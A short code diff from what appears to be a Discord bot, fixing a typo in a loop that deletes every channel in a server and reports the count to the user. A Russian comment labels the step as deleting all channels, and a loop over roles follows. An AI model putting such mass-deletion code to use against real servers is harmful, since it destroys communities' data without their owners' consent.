@@ -177,7 +177,7 @@ class MyClient(discord.Client):
 						await i.delete() #удаление всех каналов
 						c = c + 1
 					except:
-						passs
+						pass
 				await message.author.send('**:wastebasket: Каналов удалено: **' + str(c))
 				for i in message.guild.roles:
 					await asyncio.sleep(0.1)
